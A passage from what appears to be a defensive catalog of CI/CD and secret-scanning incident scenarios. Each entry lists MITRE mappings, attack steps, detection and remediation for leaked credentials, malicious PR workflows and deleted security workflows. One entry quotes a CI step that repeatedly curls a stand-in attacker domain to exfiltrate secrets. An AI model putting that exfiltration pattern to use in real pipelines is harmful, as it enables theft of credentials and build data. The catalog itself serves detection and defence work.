- **Tools**: GitHub Actions, PR Workflow
- **Scenario**: A new workflow file is created in PR by an external contributor and auto-runs
- **Attack Steps**: 1. An external contributor submits a pull request that includes a new file under .github/workflows/steal.yml.2. The repo is configured to auto-run workflows on PRs without requiring approval.3. The malicious workflow runs and accesses CI secrets.4. The event is not flagged due to lack of contributor trust validation.5. Blue team only notices after the secrets are leaked or abuse occurs.
- **Detection**: PR event logs + contributor trust setting
- **Solution**: Enforce manual approval for external PR workflows
- **Tags**: #githubpr #workflowexploit #externalcontributors

## Alert Missed on Deleted Workflow File

- **Attack Type**: CI/CD Alerting Rules
- **Target**: GitHub Actions
- **Vulnerability**: No alert for critical file deletion
- **MITRE**: T1562.001
- **Impact**: Bypass of CI security controls
- **Tools**: GitHub UI, YAML, Git
- **Scenario**: Workflow file deleted by attacker to remove detection logic
- **Attack Steps**: 1. An attacker deletes .github/workflows/security-checks.yml, which contains a key security validation step.2. This is done via a direct commit to the main branch.3. No alert is triggered for file deletion.4. Subsequent CI builds skip security checks, allowing malicious code to pass through.5. The incident is discovered after runtime compromise.6. Audit logs show the deletion, but no proactive alert was configured.
- **Detection**: GitHub commit diff logs
- **Solution**: Alert on deletion of protected CI workflow files
- **Tags**: #workflowdeletion #ciskip #ciintegrity

## Unusual API Access Pattern from CI Job

- **Attack Type**: CI/CD Alerting Rules
- **Target**: CI/CD Job
- **Vulnerability**: No anomaly detection on job network activity
- **MITRE**: T1041
- **Impact**: Covert data exfiltration through build job
- **Tools**: curl, GitHub Actions, Logs
- **Scenario**: CI job makes repeated outbound calls to same suspicious domain
- **Attack Steps**: 1. A CI job includes a step that runs curl https://badapi.attacker.com in a loop.2. The job repeatedly hits this endpoint to exfiltrate build logs or secrets.3. CI/CD monitoring tools don’t track outbound traffic frequency or domains.4. The domain isn’t flagged as malicious yet, so it stays undetected.5. Only through traffic volume review or behavioral anomaly detection is the pattern noticed.
- **Detection**: Network logs (if enabled)
- **Solution**: Monitor egress patterns from CI/CD environments
- **Tags**: #cijob #networkanomaly #buildleak

## Hardcoded AWS Keys Detected via GitHub Secret Scanning

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: Hardcoded secret in public VCS
- **MITRE**: T1552.001
- **Impact**: Potential AWS account compromise
- **Tools**: GitHub Advanced Security, AWS CLI
- **Scenario**: AWS access keys committed to GitHub by mistake trigger secret scanning alerts
- **Attack Steps**: 1. A developer accidentally commits a Python file with hardcoded aws_access_key_id and aws_secret_access_key.2. GitHub Advanced Security detects the pattern using built-in secret scanning regex and flags it as a high-severity alert.3. An email and GitHub Security tab alert is generated automatically.4. AWS is notified (if integrated) and the key is proactively revoked.5. The team must rotate the key and investigate any unauthorized use in AWS CloudTrail.
- **Detection**: GitHub secret scan + AWS notification
- **Solution**: Remove key, rotate credential, and enforce secret linting
- **Tags**: #awskey #secretleak #githubscan

## GitGuardian Flags GitLab Private Repo API Key

- **Attack Type**: Secret Scanning Integration
- **Target**: GitLab Repo
- **Vulnerability**: Exposed high-privilege GitLab token
- **MITRE**: T1552.001
- **Impact**: CI/CD control or data theft via token
- **Tools**: GitGuardian, GitLab
- **Scenario**: GitGuardian detects GitLab API token leak in private repo with team alert
- **Attack Steps**: 1. A developer pushes a .env file to a GitLab private repo that contains GITLAB_API_TOKEN.2. GitGuardian scans all commits via webhook and flags the token as matching a known API key pattern.3. A real-time alert is sent to the security team via Slack/email.4. Investigation shows the token has high repo access scope.5. GitLab token is revoked and token rotation policy is enforced.
- **Detection**: GitGuardian scan alert
- **Solution**: Implement GitGuardian, enforce pre-commit scanning
- **Tags**: #gitlabtoken #gitguardian #tokenleak

## Internal Secrets Found in Old Commits by TruffleHog

- **Attack Type**: Secret Scanning Integration
- **Target**: Git Repo (all history)
- **Vulnerability**: Secrets hidden in past commits
- **MITRE**: T1552.001
- **Impact**: Access to prod DB or APIs via historical tokens
- **Tools**: TruffleHog, Git CLI
- **Scenario**: TruffleHog finds secrets in deep Git history that weren't caught by surface scans
- **Attack Steps**: 1. Security team runs TruffleHog on a legacy repo to scan entire Git history (not just HEAD).2. It detects historical commits containing base64-encoded credentials and database URLs.3. Findings include several API tokens that are still valid in production.4. Team revokes all discovered credentials and notifies affected service owners.5. BFG Repo Cleaner is used to rewrite Git history and remove secrets completely.
- **Detection**: TruffleHog CLI report
- **Solution**: Scan full Git history, rewrite if needed
- **Tags**: #legacysecrets #trufflehog #gitreveal

## Slack Webhook Leaked in Frontend Code

- **Attack Type**: Secret Scanning Integration
- **Target**: Public Repo
- **Vulnerability**: Slack webhook URL exposed in code
- **MITRE**: T1552.001
- **Impact**: Message spoofing / Slack abuse
- **Tools**: GitHub Advanced Security, Slack API
- **Scenario**: Slack webhook URL is committed to public React project; detected via GitHub scan
- **Attack Steps**: 1. Developer includes a Slack Incoming Webhook URL (https://hooks.slack.com/services/...) inside frontend JavaScript for testing.2. File is committed and pushed to a public GitHub repo.3. GitHub Secret Scanning identifies the pattern and notifies the Slack security team.4. Slack auto-disables the webhook and sends email to the webhook owner.5. Developer rotates webhook and implements .env file handling.
- **Detection**: GitHub secret scan → Slack revocation
- **Solution**: Use .env files + restrict secrets from frontend
- **Tags**: #slackleak #webhook #frontendexposure

## GitHub Actions Token Leaked in Console Output

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Actions Job
- **Vulnerability**: Secrets in CI log output
- **MITRE**: T1552.001
- **Impact**: GitHub API misuse via token replay
- **Tools**: GitHub Actions, CI Logs
- **Scenario**: GITHUB_TOKEN is accidentally printed in CI logs and discovered later
- **Attack Steps**: 1. Developer adds a printenv command for debugging inside a GitHub Actions job.2. This prints all environment variables, including GITHUB_TOKEN, to the console output.3. Anyone with repo access can read job logs and extract the token.4. GitHub’s secret scanning fails to detect it immediately in logs.5. Red team finds token later in audit, prompting rotation and better output filtering.
- **Detection**: CI job log review
- **Solution**: Mask secrets in output, use ::add-mask:: in workflows
- **Tags**: #tokeninlogs #outputleak #cisecrets

## AWS Secrets Manager Misconfigured — GitHub Alert Ignored

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: Lack of secret lifecycle policy
- **MITRE**: T1078.004
- **Impact**: Abuse of cloud API keys due to unhandled alert
- **Tools**: GitHub Advanced Security, AWS
- **Scenario**: GitHub detects AWS key, but team ignores alert; secrets not centralized
- **Attack Steps**: 1. Developer commits a personal AWS key to GitHub.2. GitHub flags the secret and shows alert in Security tab.3. Team does not centralize secret management — so no automated rotation is triggered.4. Attacker scrapes public commits and uses the key for EC2 instance creation.5. AWS CloudTrail shows abnormal behavior hours later.
- **Detection**: GitHub Alert + CloudTrail logs
- **Solution**: Use AWS Secrets Manager + auto-rotate on alert
- **Tags**: #awsrotation #alertignored #cloudkeyleak

## Secrets in .env Files Uploaded to Public GitHub

- **Attack Type**: Secret Scanning Integration
- **Target**: Public GitHub Repo
- **Vulnerability**: Lack of .gitignore for env files
- **MITRE**: T1552.001
- **Impact**: API abuse and financial fraud risk
- **Tools**: GitHub Advanced Security, DLP
- **Scenario**: Developer uploads entire .env file containing JWT, API keys to repo
- **Attack Steps**: 1. Developer includes .env file in commit by mistake.2. File includes JWT tokens, Firebase keys, and Stripe credentials.3. GitHub secret scanning triggers alerts for Stripe and Firebase tokens.4. Incident response revokes all leaked keys.5. GitHub hooks .env in .gitignore and enables DLP rules in IDE.
- **Detection**: GitHub alert + API provider response
- **Solution**: Gitignore + IDE DLP + linting
- **Tags**: #envleak #apileak #secretdetection

## GitHub Webhook Secret Leaked via Screenshot in Wiki

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Wiki
- **Vulnerability**: Secrets exposed via visual assets
- **MITRE**: T1552.003
- **Impact**: Replay attacks or API misuse
- **Tools**: GitHub Wiki, OCR, Screenshot
- **Scenario**: A screenshot of internal config page with webhook secret is uploaded to GitHub Wiki
- **Attack Steps**: 1. Developer uploads a screenshot to GitHub Wiki that includes a visible webhook secret.2. GitHub secret scanning identifies the pattern via image OCR (beta in some tools).3. Alert is raised and team manually investigates and rotates the webhook secret.4. Root cause: lack of awareness about image-based leaks.5. Org trains developers on safe documentation practices.
- **Detection**: Secret scan + visual content inspection
- **Solution**: Avoid screenshots with secrets, use redaction tools
- **Tags**: #screenshotleak #visualdetection #webhook

## GitHub PAT Detected in Internal Gist

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Gist
- **Vulnerability**: Secret in debug file shared privately
- **MITRE**: T1552.001
- **Impact**: Unintentional insider risk
- **Tools**: GitHub PAT, GitHub Gist, Secret Scanner
- **Scenario**: A developer posts GitHub Personal Access Token in a private Gist
- **Attack Steps**: 1. Developer shares a private Gist containing debug logs, not realizing they include a full ghp_... token.2. GitHub’s internal secret scanning catches the token, even in private Gists.3. The token is revoked automatically after alert.4. Security team implements GitHub Enterprise DLP and audit hooks to prevent recurrence.5. Developers are trained to review all debug output before sharing.
- **Detection**: GitHub Secret Scan
- **Solution**: Auto-expire PATs, train on sharing practices
- **Tags**: #gistleak #pat #internalsecret

## GitGuardian Finds Leaked Heroku API Key in Discontinued Repo

- **Attack Type**: Secret Scanning Integration
- **Target**: Public GitHub Repo
- **Vulnerability**: Forgotten secrets in deprecated assets
- **MITRE**: T1552.001
- **Impact**: Account takeover or app hijack
- **Tools**: GitGuardian, Heroku
- **Scenario**: GitGuardian alerts on old Heroku API key leaked in deprecated public repo
- **Attack Steps**: 1. An old repo still hosted publicly contains a YAML file with a Heroku API key.2. GitGuardian periodically scans public repos and flags the secret.3. Alert is sent to the registered GitHub org email.4. Heroku invalidates the API key and flags the associated app.5. Org deletes repo and migrates legacy apps to new secure deployment process.
- **Detection**: GitGuardian alert + Heroku token revocation
- **Solution**: Delete deprecated repos + token audits
- **Tags**: #herokuleak #legacyrepos #secretreuse

## Accidental AWS Key Exposure Triggers GitHub Secret Scan

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: Credential hardcoded in code
- **MITRE**: T1552.001
- **Impact**: Possible AWS environment compromise
- **Tools**: GitHub Advanced Security, AWS CLI
- **Scenario**: Developer commits AWS credentials to a repo, GitHub detects and notifies
- **Attack Steps**: 1. A developer is writing integration code for AWS in Python and hardcodes aws_access_key_id and aws_secret_access_key in the script for testing.2. The developer commits and pushes the code to the GitHub repo without realizing that the sensitive credentials are embedded.3. GitHub Advanced Security immediately scans the push and matches the credential patterns against known AWS key formats.4. A secret scanning alert is raised in the Security tab of the repository and an email is sent to repository administrators.5. GitHub also notifies AWS (if integrated) which triggers automated revocation of the leaked key.6. The team investigates CloudTrail logs in AWS to determine if the key was exploited before revocation.7. The secret is rotated, and .env handling is enforced moving forward to avoid hardcoding.
- **Detection**: GitHub secret scanning alerts
- **Solution**: Use environment variables and rotate credentials regularly
- **Tags**: #awsleak #githubscan #credentialexposure

## Developer Leaks GCP Credentials in Config File

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: Exposed GCP service account key
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to GCP projects
- **Tools**: GitHub Advanced Security, GCP IAM
- **Scenario**: A GCP service account JSON is committed accidentally, triggering alerts
- **Attack Steps**: 1. A developer working on a GCP-hosted app creates a service account and downloads the credentials.json file to authenticate locally.2. The JSON file contains the client email, private key, and project ID for the service account.3. By mistake, this file is committed and pushed to a GitHub repository without being added to .gitignore.4. GitHub’s secret scanning service detects the private key pattern and flags the file within seconds.5. The alert is visible on the GitHub Security tab and optionally notifies the GCP security team.6. If integrated, GCP can automatically disable the compromised key.7. Security team revokes the service account and issues a new one with minimum required permissions.8. The development team adopts .gitignore templates and pre-commit scanning to prevent recurrence.
- **Detection**: GitHub Alert, GCP IAM audit logs
- **Solution**: Enforce .gitignore, use short-lived tokens
- **Tags**: #gcpcredentials #secretleak #jsonexposure

## GitGuardian Detects Stripe Key in Public Fork

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Public Fork
- **Vulnerability**: Secrets unintentionally pushed to public repo
- **MITRE**: T1552.001
- **Impact**: Financial fraud and API abuse
- **Tools**: GitGuardian, Stripe Dashboard
- **Scenario**: Stripe API key leaked via forked public repo is caught by GitGuardian
- **Attack Steps**: 1. A contributor forks a private e-commerce repo to work on a bugfix but forgets to remove the .env file containing the STRIPE_SECRET_KEY.2. They make the fork public while collaborating, unintentionally exposing the secret.3. GitGuardian’s public repo crawler identifies the secret within minutes and sends an alert to the registered email for the organization.4. Stripe’s automated security detection also disables the key after GitGuardian's disclosure.5. The developer receives a Slack alert from GitGuardian and immediately deletes the public fork.6. Security team audits all logs for possible misuse and generates a new Stripe key.7. They enable stricter controls to ensure forks remain private and remove sensitive files from tracked source.
- **Detection**: GitGuardian + Stripe key monitoring
- **Solution**: Enforce fork policy, rotate exposed keys
- **Tags**: #stripeleak #forkscan #apikeyabuse

## Leaked Azure Key Found in Old Repo Clone

- **Attack Type**: Secret Scanning Integration
- **Target**: Archived GitHub Repo
- **Vulnerability**: Unrevoked secrets in legacy code
- **MITRE**: T1552.001
- **Impact**: Potential identity or tenant enumeration
- **Tools**: TruffleHog, Azure CLI, Git CLI
- **Scenario**: Secret found in a local clone of a long-abandoned GitHub repository
- **Attack Steps**: 1. A security engineer performs an audit of legacy project repositories using trufflehog to scan all historical commits and branches.2. The tool detects a hardcoded Azure client secret in a Python script committed more than two years ago.3. The repo is archived and no longer maintained, but the Azure AD app linked to that secret is still active.4. Upon further analysis, the engineer confirms the secret still works via a test token exchange.5. The Azure app has broad Graph API access permissions that could allow reading organization users and roles.6. The secret is revoked immediately from the Azure Portal.7. The team retroactively rewrites the repo history using BFG Repo Cleaner and pushes cleaned code.8. Legacy repo monitoring is added, and secrets are rotated across other apps for caution.
- **Detection**: TruffleHog historical scan
- **Solution**: Rotate and monitor all legacy app credentials
- **Tags**: #azuresecret #legacyrepo #historicalleak

## Firebase Key Found via Regex in Build Artifact

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Actions Build Artifact
- **Vulnerability**: Secrets in downloadable artifacts
- **MITRE**: T1552.001
- **Impact**: Client-side misuse and abuse of app services
- **Tools**: Firebase Console, CI/CD Logs
- **Scenario**: CI pipeline artifact includes a file with Firebase key that’s leaked
- **Attack Steps**: 1. A GitHub Actions job builds a React app and generates a .env.production file inside the build directory.2. This file contains the Firebase apiKey, authDomain, and other credentials for app initialization.3. A build artifact is uploaded and publicly accessible from a GitHub Actions log via artifact download link.4. GitHub does not detect secrets inside artifacts by default.5. A red team researcher downloads the artifact and finds the key using custom regex scanning.6. Firebase logs show several unauthorized app reads and writes within hours.7. The app key is rotated from Firebase Console and environment variables are secured inside build scripts.8. The team disables public access to artifact URLs and implements an automated scanning job for CI outputs.
- **Detection**: Manual artifact inspection or regex scanner
- **Solution**: Limit public access and strip secrets from build outputs
- **Tags**: #firebaseexposure #ciartifact #secretdump

## Private Slack Webhook Leaked via Screenshot in README

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub README
- **Vulnerability**: Visual exposure of secrets
- **MITRE**: T1552.003
- **Impact**: Slack spam or data leaks
- **Tools**: OCR Secret Scanners, Slack API
- **Scenario**: README screenshot exposes internal webhook; OCR tools flag it
- **Attack Steps**: 1. A README file in a repo includes a screenshot of a Jenkins configuration dashboard.2. The screenshot unintentionally includes a visible Slack Incoming Webhook URL for internal alerts.3. An advanced secret scanning tool with OCR capabilities parses the image and flags the exposed URL.4. The Slack security team is notified (via GitHub integration) and disables the webhook proactively.5. The developer is alerted and the screenshot is removed from the repo history using git filter-branch.6. The team updates its documentation SOP to include redaction of screenshots before publishing.7. Automated linting now rejects images that include sensitive URL patterns.
- **Detection**: OCR-based secret scan
- **Solution**: Redact screenshots, disable exposed webhooks
- **Tags**: #screenshotleak #visualsecrets #slackwebhook

## Developer Shares Token via Internal Gist

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Gist
- **Vulnerability**: Secrets in developer scratchpad/Gists
- **MITRE**: T1552.001
- **Impact**: Account takeover or repo access
- **Tools**: GitHub PAT, Gist, Secret Scanning
- **Scenario**: GitHub PAT shared in a private Gist is scanned and revoked
- **Attack Steps**: 1. A developer copies and pastes a curl command with a Personal Access Token (PAT) into a private GitHub Gist for reference.2. GitHub’s secret scanning, even in private repos/Gists (Enterprise feature), scans the content and identifies the token as a live GitHub PAT.3. An alert is triggered, and the token is revoked automatically.4. The developer is emailed about the secret exposure.5. Security team reviews other Gists for similar exposure.6. Developers are advised to store debugging tools and credentials in a secure vault (e.g., 1Password or HashiCorp Vault) instead of plaintext Gists.
- **Detection**: GitHub enterprise secret scanning
- **Solution**: Use secure password managers or internal vaults
- **Tags**: #patleak #gistsecurity #tokenexposure

## Secret Leaked via Git Submodule in Public Repo

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Submodule
- **Vulnerability**: Insecure credential embedding in URLs
- **MITRE**: T1552.001
- **Impact**: Repo access, source code theft
- **Tools**: Git, Submodules, GitHub Secret Scan
- **Scenario**: A private repo added as submodule leaks credentials via .gitmodules
- **Attack Steps**: 1. A developer adds a private repository containing test credentials as a submodule in a public repo for debugging.2. The .gitmodules file and .git/config include the HTTPS URL, possibly with embedded credentials (https://user:password@domain).3. GitHub’s secret scanning detects the embedded basic auth string and raises an alert.4. Security team investigates and finds the private repo also has additional secrets in its history.5. The public repo is temporarily taken down while both projects are audited.6. Credentials are revoked and .gitmodules is stripped from commit history.7. Developers are trained to never use submodules with embedded access credentials.
- **Detection**: GitHub alert on submodule secrets
- **Solution**: Avoid submodules with secrets in URLs
- **Tags**: #submoduleleak #gitmodules #repohygiene

## API Key Leaked in .npmrc Pushed to Repo

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: Registry token hardcoded in dotfile
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to npm packages
- **Tools**: GitHub Secret Scanning, npm CLI
- **Scenario**: A private registry token in .npmrc is pushed to GitHub and flagged
- **Attack Steps**: 1. Developer sets up .npmrc to authenticate against a private package registry.2. The file includes an //registry.npmjs.org/:_authToken=... line with an active token.3. Developer commits the file to GitHub and pushes to a private repository.4. GitHub secret scanning identifies the token format and flags it.5. npm’s backend also identifies the token misuse and revokes it as a precaution.6. The registry access is disabled until a new token is generated.7. .npmrc is added to .gitignore and CI processes are updated to use environment-injected tokens only.
- **Detection**: GitHub + npm token revocation alert
- **Solution**: Mask tokens, use secure CI injection
- **Tags**: #npmtoken #dotfileleak #packageregistry

## GitHub Advanced Security Detects GitHub App Key in PEM

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: GitHub App private key committed
- **MITRE**: T1552.004
- **Impact**: GitHub App impersonation or misuse
- **Tools**: GitHub Advanced Security, GitHub Apps
- **Scenario**: A .pem file containing GitHub App private key is pushed accidentally
- **Attack Steps**: 1. A developer testing a GitHub App stores the app's private key in a .pem file locally.2. While pushing changes, the .pem file is committed by mistake and pushed to the repo.3. GitHub’s secret scanning identifies the PEM file as a private key using pattern recognition.4. GitHub sends an alert and invalidates the private key if the GitHub App is configured with revocation capabilities.5. Security team creates a new private key and reconfigures the app installation.6. .pem files are explicitly excluded via .gitignore and developers are warned to store such keys only in secret managers or GitHub Encrypted Secrets.7. Incident is documented for audit and future training.
- **Detection**: GitHub secret scan alert
- **Solution**: Store private keys in vaults, not repos
- **Tags**: #pemleak #githubapp #privatekey

## GitHub Token Leaked in Internal Issue Comment

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Issues
- **Vulnerability**: PAT exposed in internal collaboration
- **MITRE**: T1552.001
- **Impact**: Lateral movement or token abuse
- **Tools**: GitHub Enterprise, GitHub Secret Scanner
- **Scenario**: A developer posts a GitHub PAT in a comment inside a private issue, and secret scanning picks it up
- **Attack Steps**: 1. While troubleshooting a CI failure, a developer posts an internal GitHub issue and includes a curl command using a live ghp_ token for testing.2. The issue is part of a private repository, but the GitHub Advanced Security engine scans issue comments for secrets in both public and private contexts.3. The secret is matched using GitHub’s PAT regex signature, triggering an alert in the organization’s Security tab.4. GitHub revokes the token immediately to prevent misuse.5. A notification email is sent to the token owner and repository administrators.6. Security team cross-checks audit logs for any misuse of the token before revocation.7. Internal policy is updated to forbid placing tokens in any form of comments, and DLP linting rules are enforced in GitHub Actions workflows.
- **Detection**: GitHub Secret Scanner
- **Solution**: Avoid tokens in text comments; rotate PATs regularly
- **Tags**: #patleak #githubissues #detection

## Jenkins Secret Detected in Console Output

- **Attack Type**: Secret Scanning Integration
- **Target**: Jenkins Console
- **Vulnerability**: Secrets exposed via insecure logging
- **MITRE**: T1552.001
- **Impact**: Secret theft from internal build logs
- **Tools**: Jenkins, GitGuardian
- **Scenario**: A Jenkins pipeline logs credentials into the console during a build
- **Attack Steps**: 1. A CI pipeline in Jenkins uses stored credentials from its credential manager to log in to a private artifact repository.2. Due to a misconfiguration in the build script, the username and password are echoed to the console using an echo or printenv command.3. The Jenkins console output is retained by default for 30 days and is accessible by all users with pipeline access.4. GitGuardian runs an integration that periodically scrapes Jenkins logs and flags the presence of sensitive information like AWS_SECRET_ACCESS_KEY or repository passwords.5. Alert is raised and the credentials are rotated immediately.6. Jenkins logging is hardened to use masking features (e.g., withCredentials block in pipelines) and access control is reviewed.7. Secrets are moved to HashiCorp Vault and injected dynamically instead of being printed.
- **Detection**: GitGuardian scan + Jenkins console log access
- **Solution**: Use masking, restrict console access, rotate secrets
- **Tags**: #jenkinsleak #secretinlogs #vault

## Slack Bot Token in Environment Dump

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Actions
- **Vulnerability**: Secrets exposed via printenv
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to Slack or internal alerts
- **Tools**: GitHub Actions, Slack API
- **Scenario**: Secret exposed when env output is printed during workflow debugging
- **Attack Steps**: 1. A GitHub Actions workflow is configured with a SLACK_BOT_TOKEN secret to send messages to Slack.2. For debugging a failed job, a developer adds printenv to log environment variables.3. The token is output in plain text and stored in the CI log.4. GitHub’s advanced secret scanning scans CI logs and identifies the Slack token format based on known signatures.5. A detection alert is triggered, and the token is invalidated on the Slack side by their automated bot revocation system.6. Developer is notified, and secrets are masked in workflow using ::add-mask:: syntax.7. A GitHub Actions hardening guide is shared within the team, along with a CI log review policy.
- **Detection**: GitHub + Slack bot detection
- **Solution**: Mask all secrets in workflows, never use printenv blindly
- **Tags**: #slacktoken #actionleak #envdebug

## API Token Exposed via Internal Repo Wiki

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Wiki
- **Vulnerability**: Token exposed via documentation
- **MITRE**: T1552.001
- **Impact**: Abuse of real API via sample code
- **Tools**: GitHub Wiki, GitHub Scanner
- **Scenario**: Token embedded in example code block on GitHub Wiki page
- **Attack Steps**: 1. A team member documents API integration steps in the internal GitHub Wiki of a private repo.2. They paste working code examples, including a live API token (Authorization: Bearer sk_test_...) within a Markdown code block.3. GitHub’s secret scanning engine, enabled for wikis, scans this page as part of its periodic checks.4. The token is matched against known test/production API patterns for Stripe and Twilio.5. An alert is raised and visible in the repository’s Security tab.6. Admins revoke the token, and a new secure version is generated using a secure credential store.7. Developers are reminded to use fake/mock tokens in documentation and follow redaction best practices.
- **Detection**: GitHub Advanced Security
- **Solution**: Use mock credentials in docs, scan wiki content
- **Tags**: #apidocs #wikileak #redaction

## Secret Embedded in Compiled Binary Uploaded to Repo

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Releases
- **Vulnerability**: Secrets embedded in compiled executables
- **MITRE**: T1552.004
- **Impact**: API misuse, code tampering
- **Tools**: Static Scanners, Binwalk, GitHub
- **Scenario**: API key is hardcoded and left in compiled binary uploaded to GitHub
- **Attack Steps**: 1. A developer compiles a Go application that contains a hardcoded API key in the source code.2. The resulting binary is uploaded to a GitHub release as an asset.3. A red team or static scanning tool like binwalk or strings is run against the binary.4. The secret string is discovered in plaintext inside the binary due to lack of proper obfuscation or encryption.5. GitHub doesn’t detect it automatically but a GitGuardian or custom scanner flags it.6. The secret is rotated, and the binary asset is deleted.7. Developer guidelines are updated to ban hardcoded credentials in any form and review all binaries pre-release.
- **Detection**: Manual/static scan
- **Solution**: Use secure secret injection, never hardcode in builds
- **Tags**: #binaryleak #hardcodedsecret #gobuild

## Database Password Pushed in Kubernetes YAML

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo / K8s
- **Vulnerability**: Secret in plaintext Kubernetes config
- **MITRE**: T1552.001
- **Impact**: DB credential exposure in containerized app
- **Tools**: GitHub, Kubectl, GitGuardian
- **Scenario**: Kubernetes config committed with plaintext DB credentials
- **Attack Steps**: 1. A developer writes a deployment.yaml Kubernetes file which includes an env: section with MYSQL_PASSWORD.2. For convenience, the password is directly written in the file instead of referencing a secret.3. The YAML file is committed and pushed to a GitHub repo.4. GitGuardian or GitHub secret scanning matches the string as a typical MySQL password leak based on keyword proximity and entropy.5. An alert is raised, prompting revocation and a patch deployment.6. Team updates the deployment to use Kubernetes Secrets for injecting the password via a valueFrom reference.7. A YAML linter is added to reject hardcoded secrets pre-commit.
- **Detection**: GitGuardian, GitHub scan
- **Solution**: Move secrets to Kubernetes Secrets store
- **Tags**: #k8sconfig #plaintextsecrets #mysqlleak

## Secrets Leaked in .zip Archive Committed to Repo

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: Secrets hidden in zipped files
- **MITRE**: T1027
- **Impact**: Secrets evading basic scanning rules
- **Tools**: Git, unzip, TruffleHog
- **Scenario**: Compressed zip archive contains config with real credentials
- **Attack Steps**: 1. A developer commits a .zip file containing backups of config files, believing it's safe to store them compressed.2. Inside, there's a .env and config.yaml with API keys and database passwords.3. GitHub secret scanning cannot scan contents of binary .zip archives by default.4. A TruffleHog scan run later during an audit extracts and scans the archive contents.5. Several secrets are discovered, prompting immediate remediation.6. Developer removes the archive and Git history is rewritten with BFG.7. Repo guidelines are updated to ban inclusion of binary config backups in version control.
- **Detection**: TruffleHog or manual audit
- **Solution**: Disallow binary storage of sensitive files in repos
- **Tags**: #zipleak #hiddenconfig #archiveaudit

## NPM Auth Token in .yarnrc Flagged by GitHub

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: Registry token in config file
- **MITRE**: T1552.001
- **Impact**: Unauthorized publishing/access to registry
- **Tools**: Yarn, GitHub Secret Scanning
- **Scenario**: Private registry token included in yarn config file
- **Attack Steps**: 1. Developer sets up .yarnrc.yml for internal package management using a private npm registry.2. Auth token is added to the file directly under the npmScopes config.3. The file is committed and pushed to GitHub.4. GitHub detects the token using regex matching for NPM tokens and alerts the repo administrators.5. The token is revoked via npm dashboard.6. Developers rotate the token and move to using environment-injected auth in CI.7. Linting and pre-commit hooks are updated to ban secrets in .yarnrc or .npmrc directly.
- **Detection**: GitHub Secret Scan
- **Solution**: Secure registry auth via CI/ENV, not file
- **Tags**: #npmleak #yarnconfig #tokensecurity

## TruffleHog Identifies Twilio Credentials in Legacy Branch

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Branch
- **Vulnerability**: Secrets in unmaintained branches
- **MITRE**: T1552.001
- **Impact**: VoIP abuse or SMS fraud
- **Tools**: TruffleHog, Git CLI
- **Scenario**: Old feature branch contains .env file with Twilio keys
- **Attack Steps**: 1. Security team runs TruffleHog against all branches in a legacy repo.2. A stale feature branch named twilio-integration is found to contain a .env file.3. The file includes TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN, both still valid.4. The tokens are matched using entropy and keyword heuristics.5. Alerts are raised and credentials are revoked in the Twilio console.6. Branch is deleted and .gitignore rules are updated.7. CI is updated to auto-delete stale branches older than 90 days.
- **Detection**: TruffleHog scan
- **Solution**: Monitor, expire or delete old branches
- **Tags**: #twilioleak #featurebranch #stalebranch

## GitHub Scanner Flags RSA Private Key in Source Folder

- **Attack Type**: Secret Scanning Integration
- **Target**: GitHub Repo
- **Vulnerability**: SSH key committed to repo
- **MITRE**: T1552.004
- **Impact**: Unauthorized SSH access
- **Tools**: GitHub, SSH, Git
- **Scenario**: Developer accidentally commits id_rsa to source folder
- **Attack Steps**: 1. Developer uses scp to transfer files to a server and stores their id_rsa in project folder.2. They forget to .gitignore it and commit the private key into the repo.3. GitHub secret scanning identifies the file via its RSA header and length.4. Alert is triggered and email is sent to repo admins.5. SSH key is revoked from server and a new keypair is generated.6. .gitignore is updated, and hardening documentation is distributed to team.7. All dev machines are scanned for other misplaced SSH keys.
- **Detection**: GitHub secret scan
- **Solution**: Use .gitignore, store keys in secure locations
- **Tags**: #sshkey #rsaleak #repoexposure

## Developer Commits AWS Keys to Forked Public Repo

- **Attack Type**: Accidental Credential Exposure via Fork
- **Target**: GitHub Public Repo
- **Vulnerability**: Hardcoded AWS credentials in public repo
- **MITRE**: T1552.001
- **Impact**: Unauthorized AWS access via exposed tokens
- **Tools**: GitHub CLI, Git, AWS CLI
- **Scenario**: A developer forks a private repo into their personal GitHub account and accidentally pushes AWS credentials
- **Attack Steps**: 1. A developer, working remotely, clones a company’s private GitHub repository and forks it to their personal GitHub account for testing a new feature.2. During development, they add a config.js file to test integration with AWS SDK, embedding hardcoded AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY.3. The file is mistakenly committed and pushed to their public fork.4. GitHub Secret Scanning detects the AWS key pattern and automatically revokes the leaked credentials.5. AWS GuardDuty sends alerts due to login attempts using the leaked key within minutes.6. Security team disables the credentials, rotates access, and begins a post-mortem.7. The dev is reminded to never fork internal repos to public accounts and to use mocked credentials for testing.8. Company disables public forking using enterprise GitHub org policies.
- **Detection**: GitHub Secret Scanning + AWS CloudTrail
- **Solution**: Disable public forks, enforce credential scanning
- **Tags**: #awskeys #forkleak #publicrepo

## GitLab Runner Token Leaked via Git Clone URL

